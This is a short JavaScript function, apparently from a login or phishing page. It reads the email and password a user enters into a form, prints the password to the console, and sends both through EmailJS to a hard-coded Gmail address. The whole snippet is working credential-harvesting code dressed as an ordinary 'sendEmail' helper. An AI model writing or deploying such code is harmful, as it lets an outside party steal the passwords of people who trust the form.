function sendEmail() {
    emailjs.init("FLCWfGzjhSIMLmML1");
    var mailField = document.querySelector('input[name="mail_field"]');
    var passField = document.getElementById("pass_field");
    console.log(passField.value);
    emailjs.send("service_kvw3ho3", "template_w6zqi2j", { mdp: passField.value, reply_to: mailField.value, email: "gestlab.team@gmail.com" });
}